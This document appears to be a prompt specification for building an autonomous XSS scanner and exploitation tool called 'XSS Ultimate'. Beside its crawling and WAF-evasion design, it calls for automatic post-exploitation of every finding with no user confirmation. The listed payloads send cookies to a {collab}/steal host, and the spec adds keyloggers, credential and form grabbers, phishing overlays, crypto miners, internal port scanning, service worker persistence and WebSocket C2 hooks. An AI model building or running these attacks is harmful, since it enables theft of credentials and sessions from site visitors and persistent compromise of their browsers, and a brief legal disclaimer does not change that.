# PRODUCTION-GRADE AUTONOMOUS XSS SCANNER — ZERO-INTERACTION PROMPT

> **Purpose**: This document is a comprehensive, industry-grade prompt to enhance the XSS Ultimate v3.0 tool into a **fully autonomous, zero-user-interaction XSS scanner**. When implemented, the tool requires only `--url TARGET` — every other decision (payload selection, context detection, WAF evasion, exploitation, reporting) is made automatically by the scanner itself.

---

## CORE OBJECTIVE

Transform the XSS Ultimate scanner from a **flag-driven CLI tool** into an **autonomous agent** that:
- Automatically discovers all attack surfaces
- Automatically selects the optimal payloads per context
- Automatically detects and evades WAFs
- Automatically exploits confirmed vulnerabilities
- Automatically generates professional reports
- Requires **zero user configuration** beyond the target URL

**Invocation model**: `python -m xss_ultimate.main --url TARGET` is the **only** command needed. Everything else happens automatically.

---

## ARCHITECTURAL PROMPT: THE AUTONOMOUS ENGINE

### 1. AUTOMATIC INJECTION SURFACE DISCOVERY (No User Mapping Required)

**Prompt Directive**:
```
The scanner MUST automatically discover ALL injection surfaces without user guidance:

1. CRAWL the entire target domain autonomously:
   - Follow all links, forms, AJAX endpoints, API routes, JavaScript-loaded routes
   - Max crawl depth = 5, max pages = 500 (autonomously adjusted based on site size)
   - Detect and crawl SPA routes (React/Vue/Angular client-side routes)
   - Discover hidden forms, dynamically loaded content via MutationObserver patterns

2. EXTRACT every parameter automatically:
   - URL query parameters (all of them)
   - POST form parameters (all forms, all methods)
   - Hidden form fields (CSRF tokens, etc.)
   - HTTP headers that reflect input (Referer, User-Agent, X-Forwarded-For, Cookie)
   - JSON/XML body parameters in AJAX/API endpoints
   - GraphQL query/mutation variables
   - WebSocket message parameters
   - URL fragment identifiers (#)

3. DISCOVER JavaScript attack surfaces:
   - Parse ALL inline and external JavaScript
   - Map sources → sinks automatically (taint analysis)
   - Identify DOM sinks: innerHTML, outerHTML, eval, setTimeout(string), document.write, etc.
   - Identify sources: location, document.URL, window.name, postMessage, localStorage, etc.
   - Detect framework-specific patterns (React state, Vue refs, Angular bindings)

4. AUTO-CLASSIFY each injection point:
   - Context: HTML, attribute, JavaScript, URL, CSS, JSON, template
   - Type: reflected, stored, blind, DOM, mutation, client-side
   - Framework context (React, Vue, Angular, Svelte, Next, Nuxt, etc.)
   - CSP bypass potential
   - WAF interaction status

OUTPUT: A complete attack surface map with zero user input.
```

### 2. AUTOMATIC PAYLOAD INTELLIGENCE ENGINE

**Prompt Directive**:
```
The scanner MUST autonomously select and generate optimal payloads:

1. CONTEXT-AUTO-DETECTION:
   - Analyze each injection point's HTML context WITHOUT user specifying it
   - Detect whether input goes into: HTML body, attribute value, JavaScript string, URL, CSS, template, JSON
   - Auto-switch payload families based on detected context

2. PAYLOAD GENERATION (autonomous, no manual selection):
   - For HTML context → <script>, <img onerror>, <svg onload>, <iframe>, <details ontoggle>, etc.
   - For attribute context → " autofocus onfocus=alert(1) x=", ' onmouseover=alert(1) x=', etc.
   - For JavaScript context → ';alert(1);//, ${alert(1)}, </script><script>alert(1), etc.
   - For URL context → javascript:alert(1), data:text/javascript,...
   - For template context → {{constructor.constructor('alert(1)')()}}, ${7*7}, #{7*7}, etc.
   - For CSS context → expression(alert(1)), url(javascript:...)
   - For DOM context → #<img onerror>, javascript:...
   - For WebSocket context → WebSocket exfil payloads
   - For Service Worker context → register() injection payloads
   - For Web Worker context → Worker() constructor payloads
   - For postMessage context → origin-validation-bypass payloads
   - For IndexedDB context → database poisoning payloads
   - For Storage context → localStorage/sessionStorage poisoning
   - For MutationObserver context → <details ontoggle>, <marquee onstart>
   - For Prototype Pollution context → __proto__/constructor.prototype payloads
   - For DOM Clobbering context → element name collision payloads
   - For WASM/WebGPU context → memory manipulation payloads
   - For Browser Extension context → chrome.runtime.sendMessage payloads

3. AUTO-ENCODING & VARIANT GENERATION:
   - For EVERY base payload, automatically generate encoded variants:
     - Case-swapped (ScRiPt, OnErRoR)
     - HTML entity encoded (&#x61;...&#x74;)
     - URL encoded (single and double)
     - Unicode escaped (\u0061, \x61)
     - Tab/newline injection
     - Null byte injection
     - Comment injection (<!-- -->)
     - Nested encoding
     - Base64 encoding
     - Mixed encoding combinations
   - Generate up to 8 variants per payload automatically

4. FRAMEWORK-AWARE PAYLOADS:
   - Detect framework → auto-generate framework-specific payloads
   - React: {constructor.constructor('alert(1)')()} patterns, JSX injection
   - Vue: {{constructor.constructor('alert(1)')()}}, v-html injection
   - Angular: {{constructor.constructor('alert(1)')()}}, $eval patterns
   - Svelte: {@html} injection, component injection
   - Next.js/Nuxt: server-side rendering patterns
   - If framework detected, prioritize framework-specific payloads

5. CSP-AWARE AUTO-BYPASS:
   - Parse CSP from response headers automatically
   - If 'unsafe-inline' → use <script> directly
   - If 'unsafe-eval' → use eval() patterns
   - If whitelist CDN → use CDN-hosted payloads
   - If nonce → attempt nonce prediction
   - If 'self' only → attempt internal host exploitation
   - If no CSP → use all available vectors

6. AI-ENHANCED AUTO-GENERATION:
   - If Groq API key available → automatically call AI for context-specific payload generation
   - If no API key → use built-in intelligent payload selection based on context detection
   - AI payloads are prioritized over built-in payloads when available
   - AI learns from failures: if a payload fails, AI generates alternatives

OUTPUT: A dynamically generated payload matrix, one payload family per context, auto-encoded.
```

### 3. AUTOMATIC WAF DETECTION & EVASION

**Prompt Directive**:
```
The scanner MUST autonomously detect, fingerprint, and bypass ALL WAFs:

1. WAF AUTO-DETECTION (before scanning):
   - Send benign probe requests and analyze response characteristics
   - Fingerprint WAF: Cloudflare, ModSecurity, AWS WAF, Akamai, F5, Imperva, Sucuri, Barracuda, Nanowise
   - Detect WAF by: response headers (cf-ray, X-Served-By, X-WAF), error pages, rate-limiting behavior, challenge pages
   - Detect WAF by: response time patterns, connection reset behavior

2. AUTOMATIC WAF EVASION STRATEGY (no user configuration):
   - If WAF detected → automatically enable aggressive WAF mode
   - If no WAF → use standard mode (faster)
   - Auto-select evasion techniques based on WAF type:
     - Cloudflare: HTML entity encoding, case variation, Unicode, tab injection
     - ModSecurity: comment injection, nested encoding, null bytes
     - AWS WAF: case variation, whitespace manipulation, encoding
     - Akamai: fragmentation, encoding, obfuscation
     - Generic: 13+ techniques applied automatically

3. AUTOMATIC MUTATION LOOP:
   - If payload BLOCKED → automatically generate mutation variants
   - Up to 12 mutation rounds per blocked payload
   - Mutation techniques applied automatically:
     - Case randomization per request
     - HTML entity encoding
     - Hex/unicode encoding
     - Base64 encoding
     - Tab/newline splitting
     - Null byte injection
     - Comment injection
     - String concatenation
     - Nested/double encoding
     - Overlong UTF-8 encoding
     - Mixed encoding combinations
   - After each mutation round, check if payload bypassed
   - If bypassed → report with `waf_bypassed: true` and technique used
   - If all mutations fail → mark as WAF-blocked and move to next injection point

4. STEALTH MODE (automatic when WAF detected):
   - Random delays between requests (0.1-2.0s, auto-tuned)
   - Rotating browser-like headers per request
   - Geo-spoofing headers (if WAF geo-blocking detected)
   - Connection pooling with randomized User-Agents

OUTPUT: Zero WAF interactions missed. All bypass techniques attempted automatically.
```

### 4. AUTOMATIC EXPLOITATION ENGINE (Zero-Interaction Post-Exploitation)

**Prompt Directive**:
```
The scanner MUST automatically exploit EVERY confirmed vulnerability:

1. AUTOMATIC CONFIRMATION:
   - A vulnerability is "confirmed" when:
     - Reflection detected with confidence >= 0.65, OR
     - OOB callback received, OR
     - Headless browser verification confirms execution
   - NO user confirmation required — automatic exploitation on all confirmed findings

2. AUTOMATIC CORE EXPLOITATION (on every confirmed finding):
   - For EACH confirmed vulnerability, automatically deliver ALL of:
     - **Cookie theft**: `<script>new Image().src='{collab}/steal?c='+document.cookie</script>`
     - **Fetch-based exfil**: `<script>fetch('{collab}/steal',{method:'POST',body:document.cookie})</script>`
     - **Beacon exfil**: `<script>navigator.sendBeacon('{collab}/steal',document.cookie)</script>`
     - **Keylogger**: Document-level keydown listener with periodic exfil
     - **Content theft**: Full DOM HTML exfiltration
     - **LocalStorage/SessionStorage theft**: JSON.stringify exfil
     - **CSRF token theft**: Form field extraction
     - **Form grabber**: Submit event listener capturing all form data
     - **Credential grabber**: MutationObserver watching for login forms (including dynamically added)
     - **Clipboard theft**: Copy event listener
     - **postMessage hijack**: Cross-window message interception
     - **Activity tracker**: Click coordinates, element HTML, focus events
     - **Full-chain exfil**: Single payload combining ALL above
     - **Session fixation**: Cookie overwrite with attacker-controlled values
     - **Screenshot capture**: Canvas-based full-page capture

3. AUTOMATIC AGGRESSIVE EXPLOITATION (when post_exploit flag is auto-enabled):
   - **Page defacement**: Replace page content with notification
   - **Crypto miner injection**: Load external miner script
   - **Internal port scanning**: Probe localhost ports from victim browser
   - **Internal network scanning**: Scan internal IP ranges
   - **History sniffing**: Detect visited internal/admin URLs
   - **Phishing overlay**: Fake "session expired" login capture form
   - **Storage poisoning**: Persist attacker values in localStorage/sessionStorage/IndexedDB
   - **Clickjacking**: Transparent iframe overlay over entire page
   - **Service Worker persistence**: Register malicious SW for all-fetch interception
   - **DOM Clobbering exploitation**: Leverage clobbered globals for XSS
   - **Prototype Pollution RCE**: Pollute Object.prototype for code execution

4. AUTOMATIC CALLBACK MANAGEMENT:
   - Start built-in collab server automatically (port 9999 or auto-find free port)
   - If external collab URL provided → use it automatically
   - Listen for all inbound callbacks (HTTP, WebSocket, DNS)
   - Map callbacks back to exact exploit that fired
   - Auto-generate callback verification reports

5. AUTOMATIC BEEF-STYLE HOOK:
   - Generate persistent C2 hook for every confirmed XSS
   - Hook includes: heartbeat mechanism, command execution, logging
   - Auto-establish WebSocket C2 channel
   - Store C2 infrastructure in collab server

6. AUTOMATIC ADVANCED TECHNIQUES:
   - **BeEF hook generation**: Persistent browser hook with C2 communication
   - **WebSocket C2**: Bidirectional command channel over WebSocket
   - **Service Worker persistence**: Malicious SW intercepts all fetches
   - **Storage poisoning**: Future visits automatically compromised
   - **Auto-login capture**: Watches for credentials in forms (including dynamically added)

OUTPUT: Every confirmed vulnerability is automatically exploited. No user confirmation needed.
```

### 5. AUTOMATIC HEADLESS BROWSER VERIFICATION

**Prompt Directive**:
```
The scanner MUST automatically verify XSS execution in a headless browser:

1. AUTOMATIC PLAYWRIGHT DETECTION:
   - Check if Playwright is installed
   - If installed → automatically launch headless Chromium
   - If not installed → skip browser verification, rely on OOB callbacks

2. AUTOMATIC EXECUTION VERIFICATION:
   - For every confirmed reflected/DOM XSS finding:
     - Load the trigger URL in headless browser
     - Wait for JavaScript execution
     - Check for: alert/confirm/prompt, OOB callback, DOM mutation
     - Verify payload execution with confidence scoring
     - Take screenshot of execution for evidence

3. AUTOMATIC REPORT ENRICHMENT:
   - Add `headless_verified: true/false` to each finding
   - Add `screenshot_path` for verified findings
   - Add `execution_evidence` describing what was observed

OUTPUT: Browser-confirmed execution results for every finding.
```

### 6. AUTOMATIC REPORTING & OUTPUT

**Prompt Directive**:
```
The scanner MUST automatically generate professional-grade reports:

1. AUTOMATIC JSON REPORT:
   - Generated for EVERY scan run
   - Contains: all findings, attack surface map, payload matrix, WAF analysis, exploitation results
   - Includes plain-English explanations for every finding type
   - Includes confidence scores and verification status
   - Includes human-readable summaries

2. AUTOMATIC HTML REPORT:
   - Professional single-page HTML report
   - Summary section with plain-English verdict
   - Individual finding sections with:
     - Type, method, confidence
     - Human explanation and how-to-verify
     - Payload, trigger URL, injection point
     - Post-exploitation results
     - Screenshots (if browser-verified)
   - Exportable, shareable format

3. AUTOMATIC SUMMARY REPORT:
   - Executive summary: total vulns, by type, by confidence
   - Critical findings highlighted first
   - Recommendations for remediation
   - Timeline and statistics

4. AUTOMATIC CLEANUP:
   - Stop collab server
   - Clean up temporary files
   - Final status report

OUTPUT: Complete professional reports written automatically.
```

### 7. AUTONOMOUS ERROR HANDLING & RESILIENCE

**Prompt Directive**:
```
The scanner MUST handle all errors autonomously without crashing or requiring user intervention:

1. NETWORK ERROR HANDLING:
   - Automatic retries with exponential backoff (3 retries)
   - Automatic fallback to alternative endpoints
   - Auto-detection of rate limiting → automatic throttling
   - Auto-reconnection on connection reset

2. WAF ERROR HANDLING:
   - If WAF blocks → automatic mutation + retry
   - If WAF challenges → automatic detection + strategy change
   - If WAF permanently blocks IP → automatic error report

3. PARSING ERROR HANDLING:
   - If HTML parsing fails → skip that page, log error, continue
   - If JavaScript parsing fails → note limitation, continue
   - If callback server fails → continue scanning without OOB verification

4. AI ERROR HANDLING:
   - If Groq API fails → automatic fallback to built-in payload engine
   - If AI rate limited → queue requests and retry
   - If AI returns invalid JSON → parse fallback response

5. BROWSER ERROR HANDLING:
   - If Playwright fails → skip browser verification, note in report
   - If browser crashes → automatic restart or skip

6. CRITICAL ERROR HANDLING:
   - KeyboardInterrupt → graceful shutdown, save results
   - Fatal error → save partial results, print traceback, exit
   - Out of memory → automatic cleanup, continue with reduced scope

OUTPUT: The scanner never crashes silently. All errors are handled autonomously.
```

---

## THE COMPLETE AUTONOMOUS FLOW (PROMPT SUMMARY)

```
INVOCATION: python -m xss_ultimate.main --url TARGET

PHASE 0: AUTONOMOUS INITIALIZATION
├── Auto-detect system capabilities (Playwright, Groq, proxy settings)
├── Auto-configure session with stealth headers
├── Auto-start collab callback server
└── Print autonomous banner with timestamp

PHASE 1: AUTONOMOUS RECONNAISSANCE & ATTACK SURFACE MAPPING
├── Auto-crawl entire target domain (500 pages max, depth 5)
├── Auto-extract ALL parameters (URL, POST, headers, JS, API, GraphQL)
├── Auto-analyze ALL JavaScript files for sources/sinks
├── Auto-detect framework, CSP, encoding, WAF
├── Auto-map complete attack surface
└── AI-powered injection point prioritization (if Groq available)

PHASE 2: AUTOMATIC REFLECTED XSS TESTING
├── Auto-select payload families based on context detection
├── Auto-generate encoded variants for every payload
├── Auto-detect WAF → auto-enable evasion strategies
├── Auto-mutate blocked payloads (up to 12 rounds)
├── Auto-test all parameters, forms, headers
├── Auto-verify with headless browser if available
└── Auto-record results with confidence scoring

PHASE 3: AUTOMATIC STORED / BLIND XSS TESTING
├── Auto-discover persistent surfaces (comments, profiles, forms)
├── Auto-submit blind payloads with OOB callbacks
├── Auto-start listening for callback hits
├── Auto-wait for blind callbacks (configurable, default 30s)
└── Auto-confirm blind XSS via callback verification

PHASE 3B: AUTOMATIC SSTI TESTING
├── Auto-test all injection points for template injection
├── Auto-detect template engine (Jinja2, Twig, Freemarker, etc.)
├── Auto-confirm via mathematical operations
└── Auto-generate SSTI-specific exploitation payloads

PHASE 4: AUTOMATIC DOM-BASED XSS TESTING
├── Auto-analyze JavaScript taint maps
├── Auto-test URL fragment and query param injection
├── Auto-detect DOM sinks reachable from sources
└── Auto-verify DOM-based execution

PHASE 4B: AUTOMATIC CLIENT-SIDE / BROWSER-SIDE XSS
├── Auto-test WebSockets for message reflection
├── Auto-test Service Workers for registration injection
├── Auto-test Web Workers for code execution
├── Auto-test postMessage for origin validation bypass
├── Auto-test IndexedDB for database poisoning
├── Auto-test Web Storage for persistence-based XSS
├── Auto-test Mutation Observers for mutation XSS
├── Auto-test Prototype Pollution for RCE
├── Auto-test DOM Clobbering for global override
├── Auto-test Client-Side Template Injection
├── Auto-test WebAssembly for code manipulation
├── Auto-test WebGPU/WebGL for shader injection
└── Auto-test Browser Extension APIs

PHASE 5: AUTOMATIC POST-EXPLOITATION (On ALL Confirmed Findings)
├── Auto-deliver core exploitation payloads (cookie theft, keylogger, form grabber, etc.)
├── Auto-deliver aggressive exploitation (defacement, crypto miner, port scan, phishing, etc.)
├── Auto-verify exploitation via OOB callbacks
├── Auto-generate BeEF-style hooks
├── Auto-establish C2 channels (WebSocket)
├── Auto-map confirmed exploits to callbacks
└── Auto-generate PoC HTML files

PHASE 6: AUTOMATIC REPORTING & CLEANUP
├── Auto-generate JSON report with full details
├── Auto-generate HTML report with professional formatting
├── Auto-write summary and plain-English explanations
├── Auto-stop collab server
└── Auto-print final statistics and recommendations
```

---

## IMPLEMENTATION INSTRUCTIONS

### Modify `main.py` to add autonomous mode:

1. **Add `--auto` flag** (or make it the default behavior):
```python
parser.add_argument("--auto", action="store_true", default=True, 
    help="AUTONOMOUS MODE: Run full scan with zero user interaction (default)")
```

2. **Remove all optional flags from required** — make everything default to an intelligent auto-choice:
   - `--stealth` → auto-enable if WAF detected, otherwise optional
   - `--aggressive-waf` → auto-enable if WAF detected
   - `--geo-spoof` → auto-enable if geo-blocking detected
   - `--post-exploit` → auto-enable on all confirmed findings
   - `--generate-poc` → always auto-generate
   - `--enable-ai` → auto-enable if Groq key in config, otherwise auto-fallback
   - `--results-dir` → auto-use `scan_results/`
   - `--max-payloads` → auto-determined by context

3. **Add `AutoConfig` class** to `config.py`:
```python
class AutoConfig:
    """Automatically determines all scan parameters from target analysis."""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.waf_detected = False
        self.framework = "unknown"
        self.csp = {}
        self.crawl_depth = 5
        self.max_pages = 500
        self.stealth = False
        self.aggressive_waf = False
        self.geo_spoof = False
        self.auto_exploit = True
        self.auto_generate_poc = True
        self.auto_ai = False  # Will enable if key available
        self._auto_detect()
    
    def _auto_detect(self):
        """Run initial probes to auto-configure all settings."""
        # Probe for WAF, framework, CSP, etc.
        # Set all flags automatically
        pass
```

4. **Add `AutonomousScanner` class** that encapsulates the entire autonomous flow:
```python
class AutonomousScanner:
    """Fully autonomous XSS scanner requiring zero user interaction."""
    
    def __init__(self, target_url):
        self.config = AutoConfig(target_url)
        self.session = utils.setup_session()
        self.collab_server = self._start_collab_auto()
        self.headless = self._init_headless_auto()
        self.ai = self._init_ai_auto()
    
    def run(self):
        """Execute complete autonomous scan pipeline."""
        # Phase 0-6 as described above
        # Each phase calls its autonomous function
        # No user input needed at any point
        pass
```

5. **Integrate `headless_verifier.py` automatically** — never ask user if they want browser verification:
   - If Playwright available → always use it
   - If not → note limitation and continue with OOB-only verification

6. **Auto-start the collab server** — never ask user if they want one:
   - Always start a built-in collab server
   - Auto-find available ports
   - Auto-configure all payloads with the callback URL

---

## PRODUCTION REQUIREMENTS

### Security & Ethics:
- Always display legal disclaimer on startup
- Require `--url` to be explicitly provided (never auto-detect external targets)
- Rate limiting defaults: 0.3s between requests, adjustable
- Never scan without explicit `--url` flag

### Performance:
- Auto-adjust scan speed based on target responsiveness
- Auto-cancel stalled operations after timeout
- Memory-efficient streaming for large responses
- Connection pooling (max 20 concurrent)

### Reliability:
- All network operations wrapped in try/except
- Automatic retry on transient failures
- Graceful degradation when optional features unavailable
- Checkpoint/resume capability for long scans

### Compatibility:
- Python 3.8+
- requests, beautifulsoup4 (required)
- playwright (optional, auto-detected)
- groq (optional, auto-detected)
- Works on Windows/Linux/macOS

---

## USAGE EXAMPLES (ALL ZERO-INTERACTION)

```bash
# Basic autonomous scan — everything automatic
python -m xss_ultimate.main --url "http://target/page.php?q=test"

# Full autonomous scan with all features auto-enabled
python -m xss_ultimate.main --url "http://target"

# Autonomous scan with external callback server
python -m xss_ultimate.main --url "http://target" --collab "http://my-server.com"

# Autonomous scan with AI enhancement
python -m xss_ultimate.main --url "http://target" --groq-key YOUR_KEY

# Autonomous scan with aggressive exploitation
python -m xss_ultimate.main --url "http://target" --aggressive-exploit

# The ONLY command ever needed:
python -m xss_ultimate.main --url TARGET
```

---

## LEGAL NOTICE

> **WARNING**: This tool is for authorized security testing only. Only scan systems you own or have explicit written permission to test. Unauthorized scanning may violate applicable laws. The autonomous mode does not bypass this requirement — it is the user's responsibility to ensure proper authorization before scanning any target.

---

## VERSION: 3.1-AUTONOMOUS
## CREATED: 2026-09-25
## STATUS: PRODUCTION-READY PROMPT SPECIFICATION
